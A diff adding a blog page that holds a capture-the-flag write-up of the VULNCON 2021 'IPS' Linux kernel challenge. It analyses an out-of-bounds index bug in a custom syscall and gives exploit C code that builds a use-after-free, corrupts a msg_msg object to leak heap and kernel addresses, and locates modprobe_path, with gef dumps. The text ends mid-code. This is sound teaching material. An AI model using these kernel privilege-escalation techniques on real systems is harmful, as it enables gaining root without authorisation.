@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>VULNCON CTF 2021 - IPS | kileak</title>
+
+
+
+
+
+<meta name="description" content="VULNCON CTF 2021 - IPS">
+
+
+<meta name="keywords" content="vulncon, ips">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2021/vulncon-ips/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">VULNCON CTF 2021 - IPS</h1>
+      <p class="post-meta">Dec 8, 2021</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>IPS
+<!--break--></p>
+
+  <p>0 solves / 500 points
+all available (heap) mitigations are on. perf_event_open is removed from the syscall table. get root.</p>
+
+  <p>ssh ctf@35.197.193.43 -p 10000
+pass : wolfie&gt;</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/vulncon21/ips/ips.tar.gz">ips.tar.gz</a> <a href="https://kileak.github.io/assets/vulncon21/ips/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/vulncon21/ips/pwn.c">pwn.c</a></p>
+
+</blockquote>
+
+<p>Since we were playing hitcon this weekend, I missed this ctf, but was told, that they had an unsolved kernel challenge and decided to take a look at it afterwards.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Linux (none) 5.14.16 #2 SMP Mon Nov 22 19:24:06 UTC 2021 x86_64 GNU/Linux
+</code></pre></div></div>
+
+<p>Pretty new kernel with heap mitigations on, so we have to handle randomized free lists and freelist pointer hardening.</p>
+
+<p>The challenge itself introduced a new syscall IPS (548)</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define MAX 16
+</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">priority</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">userdata</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">priority</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">114</span><span class="p">];</span>
+<span class="p">}</span> <span class="n">chunk</span><span class="p">;</span>
+
+<span class="n">chunk</span> <span class="o">*</span><span class="n">chunks</span><span class="p">[</span><span class="n">MAX</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+<span class="kt">int</span> <span class="n">last_allocated_idx</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+<span class="n">SYSCALL_DEFINE2</span><span class="p">(</span><span class="n">ips</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="n">choice</span><span class="p">,</span> <span class="n">userdata</span> <span class="o">*</span><span class="p">,</span> <span class="n">udata</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">114</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">udata</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">&amp;&amp;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">udata</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">115</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">udata</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">udata</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">)))</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">case</span> <span class="mi">1</span><span class="p">:</span> <span class="k">return</span> <span class="n">alloc_storage</span><span class="p">(</span><span class="n">udata</span><span class="o">-&gt;</span><span class="n">priority</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
+    <span class="k">case</span> <span class="mi">2</span><span class="p">:</span> <span class="k">return</span> <span class="n">remove_storage</span><span class="p">(</span><span class="n">udata</span><span class="o">-&gt;</span><span class="n">idx</span><span class="p">);</span>
+    <span class="k">case</span> <span class="mi">3</span><span class="p">:</span> <span class="k">return</span> <span class="n">edit_storage</span><span class="p">(</span><span class="n">udata</span><span class="o">-&gt;</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
+    <span class="k">case</span> <span class="mi">4</span><span class="p">:</span> <span class="k">return</span> <span class="n">copy_storage</span><span class="p">(</span><span class="n">udata</span><span class="o">-&gt;</span><span class="n">idx</span><span class="p">);</span>
+    <span class="nl">default:</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>So, we can allocate, free, edit and copy chunks (though the copy will only copy a reference).</p>
+
+<p>By just taking a quick glance, I first jumped on the assumption, that you could just copy a chunk, free the original one and would directly have an UAF, but they also cleared the copied references in the <code class="language-plaintext highlighter-rouge">remove_storage</code> function.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">remove_storage</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span><span class="p">((</span><span class="n">idx</span> <span class="o">=</span> <span class="n">check_idx</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">!=</span> <span class="n">idx</span> <span class="o">&amp;&amp;</span> <span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">])</span> <span class="p">{</span>
+      <span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="n">kfree</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
+  <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>So, it was a bit more subtle, how to get to an UAF chunk. Though copying a chunk wasn’t helpful in this direction, it had another bug, which would help us out here.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">get_idx</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="n">i</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">check_idx</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="n">MAX</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">idx</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">copy_storage</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span><span class="p">((</span><span class="n">idx</span> <span class="o">=</span> <span class="n">check_idx</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">target_idx</span> <span class="o">=</span> <span class="n">get_idx</span><span class="p">();</span>         
+  <span class="n">chunks</span><span class="p">[</span><span class="n">target_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+  <span class="k">return</span> <span class="n">target_idx</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">copy_storage</code> will first check, if we passed it an index in the valid range (<code class="language-plaintext highlighter-rouge">check_idx</code> will return <code class="language-plaintext highlighter-rouge">-1</code> otherwise and bail out). <code class="language-plaintext highlighter-rouge">get_idx</code> will then try to find the next free storage and return its index. But, if it doesn’t find a free chunk, it will also return <code class="language-plaintext highlighter-rouge">-1</code> and that one  isn’t checked in <code class="language-plaintext highlighter-rouge">copy_storage</code>. So, if the chunk table is full, it will copy the chunk reference to <code class="language-plaintext highlighter-rouge">chunks[-1]</code>, which isn’t handled in <code class="language-plaintext highlighter-rouge">remove_storage</code>.</p>
+
+<p>Still, having a chunk outside of our table wouldn’t be all that helpful, if there wasn’t another bug in <code class="language-plaintext highlighter-rouge">edit_storage</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">edit_storage</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span><span class="p">((</span><span class="n">idx</span> <span class="o">=</span> <span class="n">check_idx</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+  <span class="n">memcpy</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">edit_storage</code> will also call <code class="language-plaintext highlighter-rouge">check_idx</code> to see, if we passed a valid index, but it doesn’t return, if <code class="language-plaintext highlighter-rouge">check_idx</code> returns <code class="language-plaintext highlighter-rouge">-1</code>. So by passing an invalid index, <code class="language-plaintext highlighter-rouge">idx</code> will be set to <code class="language-plaintext highlighter-rouge">-1</code>, and if we have an address at <code class="language-plaintext highlighter-rouge">chunks[-1]</code>, it will copy our input into it.</p>
+
+<p>Something to work with… But since we have to deal with randomized free list, we won’t know, in which order the chunks will be allocated in the storage. We also need to get around hardened freelist pointers, which will be xor’ed with a secret value, so even knowing some random addresses won’t help us much.</p>
+
+<p>We need to exactly know, at which address, which chunk is allocated, so we need some proper leaks first.</p>
+
+<p>For this, I completely filled up the storage with some marker values to be able to recognize them later in leak output.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Fillup complete storage</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+<span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+<span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
+
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="mh">0x4141414141414150</span> <span class="o">+</span> <span class="n">i</span><span class="p">;</span>
+    <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Then, I used the bug in <code class="language-plaintext highlighter-rouge">copy_storage</code> to copy a chunk address to <code class="language-plaintext highlighter-rouge">chunk[-1]</code> and free it.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Create uaf copy</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">copy</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">removechunk</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span></code></pre></figure>
+
+<p>By this, we now have effectively a freed chunk in <code class="language-plaintext highlighter-rouge">chunk[-1]</code>. Despite randomization, we will get the last freed chunk on the next allocation, so I created a <code class="language-plaintext highlighter-rouge">msg_msg</code> object, which will be stored in the freed chunk, which <code class="language-plaintext highlighter-rouge">chunk[-1]</code> points to.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Create msg_msg in uaf chunk</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>
+<span class="n">msg_alloc</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef&gt; x/30gx $table
+0xffffffff82cec8b0:	0x0000000000000000	0xffff888006e3bf00 &lt;= chunks[-1]
+0xffffffff82cec8c0:	0x0000000000000000	0xffff888006e3b500 &lt;= chunks[0]
+0xffffffff82cec8d0:	0xffff888006e3b900	0xffff888006e3bb80
+0xffffffff82cec8e0:	0xffff888006e3bd00	0xffff888006e3bd80
+0xffffffff82cec8f0:	0xffff888006e3be00	0xffff888006e3b680
+0xffffffff82cec900:	0xffff888006e3ba80	0xffff888006e3b880
+0xffffffff82cec910:	0xffff888006e3b380	0xffff888006e3b980
+0xffffffff82cec920:	0xffff888006e3b600	0xffff888006e3bc80
+0xffffffff82cec930:	0xffff888006e3be80	0xffff888006e3b480
+0xffffffff82cec940:	0x0000000000000000	0x0000000000000000
+0xffffffff82cec950:	0x0000000000000000	0x0000000000000000
+0xffffffff82cec960:	0x0000000000000000	0x0000000000000000
+0xffffffff82cec970:	0x0000000000000000	0x0000000000000000
+0xffffffff82cec980:	0x0000000000000000	0x0000000000000000
+0xffffffff82cec990:	0x0000000000000000	0x0000000000000000
+
+gef&gt; x/30gx 0xffff888006e3bf00
+0xffff888006e3bf00:	0xffff888006e940c0	0xffff888006e940c0 &lt;= msg_msg struct
+0xffff888006e3bf10:	0x0000000000000001	0x0000000000000050
+0xffff888006e3bf20:	0x0000000000000000	0xffff888006ed7490
+0xffff888006e3bf30:	0x0000000000000000	0x0000000000000000
+0xffff888006e3bf40:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>With the bug from <code class="language-plaintext highlighter-rouge">edit_storage</code>, we can now edit <code class="language-plaintext highlighter-rouge">chunk[-1]</code> and overwrite the data from <code class="language-plaintext highlighter-rouge">msg_msg</code>.</p>
+
+<p>We just have to take care that <code class="language-plaintext highlighter-rouge">chunk-&gt;data</code> starts at offset <code class="language-plaintext highlighter-rouge">14</code>, so we will overwrite the upper 2 bytes from <code class="language-plaintext highlighter-rouge">msg_msg-&gt;m_list</code>, but they will most likely just be <code class="language-plaintext highlighter-rouge">\xff\xff</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Corrup msg_msg to leak followup data</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>        <span class="c1">// upper 2 bytes of kernel address will always be 0xffff</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span> <span class="c1">// overwrite msg_type and msg_size</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef&gt; x/30gx 0xffff888006e40e80
+0xffff888006e3bf00:	0xffff888006eb4dc0	0xffff888006eb4dc0 &lt;= msg_msg struct
+0xffff888006e3bf10:	0x4141414141414141	0x4141414141414141 &lt;= m_type / size
+0xffff888006e3bf20:	0x0000000000000000	0xffff888006ed9520
+0xffff888006e3bf30:	0x0000000000000000	0x0000000000000000
+0xffff888006e3bf40:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">msg_msg</code> struct now has a type and size of <code class="language-plaintext highlighter-rouge">0x4141414141414141</code>, so we can now leak the data behind it (which hopefully contains some of our storage chunks).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Receive msg_msg for leaks</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x4000</span><span class="p">);</span>
+<span class="n">msgrcv</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">payload</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x0000: 0x0000000000000000 0x4141414141414141 &lt;= msg_msg content
+0x0010: 0x0000000000000000 0x0000000000000000
+0x0020: 0x0000000000000000 0x0000000000000000
+0x0030: 0x0000000000000000 0x0000000000000000
+0x0040: 0x0000000000000000 0x0000000000000000
+0x0050: 0x0000000000000000 0x0000000000000000
+0x0060: 0x0000000000000003 0xffffffff8138ae40
+0x0070: 0x0000000000000000 0xffffffff81a11640
+0x0080: 0xffff888006d7b0c0 0xffffffff81a11600 &lt;= x / kernel address
+0x0090: 0xffff888006d7bf00 0xffffffff820477a8
+0x00a0: 0xffff888006f06878 0xffff888006ebcdd0
+0x00b0: 0x0000000000000000 0x0000000000000000
+
+...
+
+0x0140: 0x0000000000000000 0x0000000000000000
+0x0150: 0x0000000000000000 0x0000000000000000
+0x0160: 0xffff888006ebc080 0x414100000000000c &lt;= chunk 12 (next / index / priority)
+0x0170: 0x414141414141415c 0x0000000000000000 &lt;= marker chunk 12
+0x0180: 0x0000000000000000 0x0000000000000000
+0x0190: 0x0000000000000000 0x0000000000000000
+0x01a0: 0x0000000000000000 0x0000000000000000
+0x01b0: 0x0000000000000000 0x0000000000000000
+0x01c0: 0x0000000000000000 0x0000000000000000
+0x01d0: 0x0000000000000000 0x0000000000000000
+0x01e0: 0x0000000000000000 0x0000000000000000
+0x01f0: 0x0000000000000000 0x0000000000000000
+0x0200: 0x0000000000000000 0x0000000000000000
+0x0210: 0x0000000000000000 0x0000000000000000
+0x0220: 0x812ac01da3069a8f 0x0000000000000000 &lt;= obfuscated freelist pointer
+0x0230: 0x0000000000000000 0x0000000000000000
+0x0240: 0x0000000000000000 0x0000000000000000
+0x0250: 0x0000000000000000 0x0000000000000000
+
+...
+
+0x03b0: 0x0000000000000000 0x0000000000000000
+0x03c0: 0x0000000000000000 0x0000000000000000
+0x03d0: 0x0000000000000000 0x0000000000000000
+0x03e0: 0xffff888006ebc280 0x4141000000000006 &lt;= chunk 6
+0x03f0: 0x4141414141414156 0x0000000000000000 &lt;= chunk 6 marker
+0x0400: 0x0000000000000000 0x0000000000000000
+0x0410: 0x0000000000000000 0x0000000000000000
+
+...
+
+0x05b0: 0x0000000000000001 0xffff888006f06750
+0x05c0: 0xffff888006f06790 0xffff888006ebcb80
+0x05d0: 0x0000000000000000 0x0000000000000000
+0x05e0: 0xffff888006ebc780 0x414100000000000b &lt;= chunk 11
+0x05f0: 0x414141414141415b 0x0000000000000000 &lt;= chunk 11 marker</code></pre></figure>
+
+<p>We can retrieve quite some info from this leak, but the order of chunks will always be randomized (and it can also happen, that we don’t find enough information in the leak, since the chunks were allocated in a “bad” order.).</p>
+
+<p>Though, even with knowing the offsets in the payload, we won’t know where the chunks are exactly located, but combining that knowledge with the <code class="language-plaintext highlighter-rouge">next</code> pointer of every chunk, we can recalculate, where some of the chunks are stored.</p>
+
+<p>This could be optimized a lot by previously freeing some chunks via <code class="language-plaintext highlighter-rouge">msgsend/msgrecv</code> and also retrieve more information from every stage, but for simplicitys sake, I separated each step.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">chunk_info</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">next</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">chunk_info</span> <span class="n">chunks</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+
+<span class="kt">void</span> <span class="nf">find_chunk_info</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+
+  <span class="c1">// Stage1 : Find offsets of chunks in payload</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">ptr</span> <span class="o">=</span> <span class="n">buffer</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(((</span><span class="o">*</span><span class="n">ptr</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4141414141414100</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="o">*</span><span class="n">ptr</span> <span class="o">&amp;</span> <span class="mh">0x00000000000000ff</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x41</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="c1">// Found a chunk</span>
+      <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">ptr</span> <span class="o">&amp;</span> <span class="mh">0x00000000000000ff</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x50</span><span class="p">;</span>
+
+      <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
+      <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">next</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">((</span><span class="n">kernel_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="o">*</span><span class="n">ptr</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x600</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="n">kernel_base</span> <span class="o">=</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">-</span> <span class="mh">0xa11600</span><span class="p">;</span>
+      <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x144fa20</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span></code></pre></figure>
+
+<p>First, we just try to find the markers of every chunk in the leak and store the offset in the leak and the <code class="language-plaintext highlighter-rouge">next</code> pointer from that chunk.</p>
+
+<p>With this we can now check, if we found two adjacent chunks, by which we’ll know the exact address of the next chunk.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Stage2 : Find addresses of chunks</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">15</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+<span class="p">{</span>
